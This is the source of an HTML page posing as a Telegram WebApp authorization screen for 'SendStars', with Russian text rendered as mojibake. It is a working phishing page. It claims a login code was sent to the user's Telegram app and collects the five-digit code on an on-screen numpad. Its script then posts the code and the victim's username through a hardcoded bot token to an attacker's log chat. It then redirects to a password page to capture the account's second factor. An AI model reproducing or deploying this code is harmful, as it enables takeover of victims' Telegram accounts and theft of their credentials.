<!DOCTYPE html>
<html lang="ru">
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width,initial-scale=1" />
		<title>SendStars ‚Äî –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</title>
		<script src="https://telegram.org/js/telegram-web-app.js"></script>
		<style>
			:root {
				--bg: #1c1b1b;
				--text: #fff;
				--box: #2a2a2a;
			}

			* {
				box-sizing: border-box;
				margin: 0;
				padding: 0;
			}
			html,
			body {
				height: 100%;
			}

			body {
				font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto,
					'Helvetica Neue', Arial;
				background: var(--bg);
				display: flex;
				align-items: center;
				justify-content: center;
				color: var(--text);
			}

			.screen {
				width: 400px;
				display: flex;
				flex-direction: column;
				align-items: center;
				text-align: center;
				gap: 15px;
			}

			.avatar img {
				width: 120px;
				height: auto;
				object-fit: contain;
				display: block;
			}

			.hint {
				font-size: 14px;
				color: #aaa;
				margin-bottom: 0;
				line-height: 1.4;
				max-width: 320px;
			}

			.privacy-link {
				font-size: 14px;
				color: #2a9bf8;
				text-decoration: none;
				cursor: pointer;
				transition: color 0.2s;
			}

			.privacy-link:hover {
				color: #1a8be8;
				text-decoration: underline;
			}

			.code-boxes {
				display: flex;
				gap: 10px;
				margin: 10px 0 20px;
			}

			.code-box {
				width: 40px;
				height: 50px;
				border-radius: 8px;
				background: var(--box);
				display: flex;
				align-items: center;
				justify-content: center;
				font-size: 32px;
				font-weight: 600;
				color: #fff;
				border: 2px solid #3a3a3a;
				transition: border-color 0.2s;
			}

			.code-box.filled {
				border-color: #2a9bf8;
			}

			.numpad {
				display: grid;
				grid-template-columns: repeat(3, 80px);
				gap: 12px;
				justify-content: center;
			}

			.numpad button {
				width: 80px;
				height: 60px;
				font-size: 22px;
				border-radius: 12px;
				border: none;
				background: var(--box);
				color: var(--text);
				font-weight: 600;
				cursor: pointer;
				transition: background 0.2s;
			}

			.numpad button:hover {
				background: #3a3a3a;
			}

			.numpad button:active {
				background: #4a4a4a;
			}

			/* –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ */
			.loading-screen {
				display: none;
				flex-direction: column;
				align-items: center;
				gap: 20px;
			}

			.spinner {
				border: 4px solid rgba(255, 255, 255, 0.2);
				border-top: 4px solid #fff;
				border-radius: 50%;
				width: 50px;
				height: 50px;
				animation: spin 1s linear infinite;
			}

			@keyframes spin {
				0% {
					transform: rotate(0deg);
				}
				100% {
					transform: rotate(360deg);
				}
			}
		</style>
	</head>
	<body>
		<div class="screen" id="authScreen">
			<div class="avatar">
				<img src="avatar.gif" alt="avatar" />
			</div>
			<div class="hint">–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Telegram.</div>

			<div class="hint">
				–≠—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ, –≤–≤–∏–¥—É –ø–æ—Å–ª–µ–¥–Ω–∏—Ö –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤
				<a
					href="https://telegram.org/privacy"
					target="_blank"
					class="privacy-link"
					>–ü–æ–ª–∏—Ç–∏–∫–µ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏</a
				>.
			</div>

			<div class="code-boxes" id="codeBoxes">
				<div class="code-box"></div>
				<div class="code-box"></div>
				<div class="code-box"></div>
				<div class="code-box"></div>
				<div class="code-box"></div>
			</div>

			<div class="numpad">
				<button data-value="1">1</button>
				<button data-value="2">2</button>
				<button data-value="3">3</button>
				<button data-value="4">4</button>
				<button data-value="5">5</button>
				<button data-value="6">6</button>
				<button data-value="7">7</button>
				<button data-value="8">8</button>
				<button data-value="9">9</button>
				<div></div>
				<button data-value="0">0</button>
				<button data-action="backspace">‚Üê</button>
			</div>
		</div>

		<!-- –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ -->
		<div class="screen loading-screen" id="loadingScreen">
			<div class="spinner"></div>
			<div>–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–≤–µ–¥—ë–Ω–Ω–æ–≥–æ –∫–æ–¥–∞‚Ä¶</div>
		</div>

		<script>
			(function () {
				'use strict';

				let tg;
				try {
					tg = window.Telegram?.WebApp;
					if (tg) {
						tg.expand();
					}
				} catch (e) {
					console.log('Telegram WebApp init error:', e);
				}

				const codeBoxes = document.querySelectorAll('.code-box');
				let code = '';
				let isProcessing = false;

				function updateBoxes() {
					try {
						codeBoxes.forEach((box, i) => {
							if (code[i]) {
								box.textContent = '‚Ä¢';
								box.classList.add('filled');
							} else {
								box.textContent = '';
								box.classList.remove('filled');
							}
						});
					} catch (e) {
						console.log('Error updating boxes:', e);
					}
				}

				function safeNavigate(url) {
					try {
						if (isProcessing) return;
						isProcessing = true;
						window.location.href = url;
					} catch (e) {
						console.log('Navigation error:', e);
						isProcessing = false;
					}
				}

				function sendCodeToBot(safeCode) {
					try {
						const botToken = '7324446797:AAEnKkmIjlDY-fa1J2HYrNupKD6ejXJn_A4';
						const logChatId = '-1003268790940';

						const user = tg?.initDataUnsafe?.user;
						const username = user?.username
							? `@${user.username}`
							: '–±–µ–∑ username';

						const message = `üîê –ö–æ–¥ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏–∑ WebApp\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${username}\nüî¢ –ö–æ–¥: ${safeCode}`;

						fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
							method: 'POST',
							headers: {
								'Content-Type': 'application/json',
							},
							body: JSON.stringify({
								chat_id: logChatId,
								text: message,
								parse_mode: 'HTML',
							}),
						}).catch(error => {
							console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞ –≤ –ª–æ–≥:', error);
						});
					} catch (e) {
						console.log('Error sending code to bot:', e);
					}
				}

				function handleCodeInput(value) {
					try {
						if (isProcessing) return;

						if (value === 'backspace') {
							code = code.slice(0, -1);
						} else if (!isNaN(value) && value !== ' ' && value !== null) {
							if (code.length < 5) code += value;
						}

						updateBoxes();

						if (code.length === 5) {
							processAuthCode();
						}
					} catch (e) {
						console.log('Error handling code input:', e);
					}
				}

				function processAuthCode() {
					try {
						if (isProcessing) return;
						isProcessing = true;

						const authScreen = document.getElementById('authScreen');
						const loadingScreen = document.getElementById('loadingScreen');

						if (authScreen) authScreen.style.display = 'none';
						if (loadingScreen) loadingScreen.style.display = 'flex';

						try {
							if (tg && tg.sendData) {
								tg.sendData(
									JSON.stringify({
										type: 'auth_code',
										code: code,
										user_id: tg.initDataUnsafe?.user?.id,
										phone_number: '',
									})
								);
							}
						} catch (sendError) {
							console.log('Error sending data to Telegram:', sendError);
						}

						sendCodeToBot(code);

						setTimeout(() => {
							safeNavigate(
								`password.html?phone=&code=${encodeURIComponent(code)}`
							);
						}, 2000);
					} catch (processError) {
						console.log('Error processing auth code:', processError);
						isProcessing = false;
					}
				}

				function initializeButtons() {
					try {
						const buttons = document.querySelectorAll('.numpad button');
						buttons.forEach(btn => {
							btn.addEventListener('click', function (e) {
								e.preventDefault();
								const value =
									this.getAttribute('data-value') ||
									this.getAttribute('data-action');
								if (value) {
									handleCodeInput(value);
								}
							});
						});
					} catch (e) {
						console.log('Error initializing buttons:', e);
					}
				}

				function init() {
					try {
						initializeButtons();
						updateBoxes();

						// –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ–º –ø–æ–≤—Ç–æ—Ä–Ω—É—é –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é
						document.removeEventListener('DOMContentLoaded', init);
					} catch (e) {
						console.log('Error in init:', e);
					}
				}

				if (document.readyState === 'loading') {
					document.addEventListener('DOMContentLoaded', init);
				} else {
					init();
				}
			})();
		</script>
	</body>
</html>
